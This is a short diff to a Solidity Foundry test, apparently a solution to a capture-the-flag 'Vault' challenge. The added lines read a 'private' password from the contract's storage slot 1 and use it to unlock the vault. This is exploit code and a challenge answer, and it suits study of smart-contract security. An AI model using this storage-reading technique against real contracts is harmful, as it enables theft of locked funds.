@@ -37,7 +37,8 @@ contract TestVault is BaseTest {
         /** CODE YOUR EXPLOIT HERE */
 
         vm.startPrank(player, player);
-
+        bytes32 pass = vm.load(address(level), bytes32(uint256(1)));
+        level.unlock(pass);
         vm.stopPrank();
     }
 }
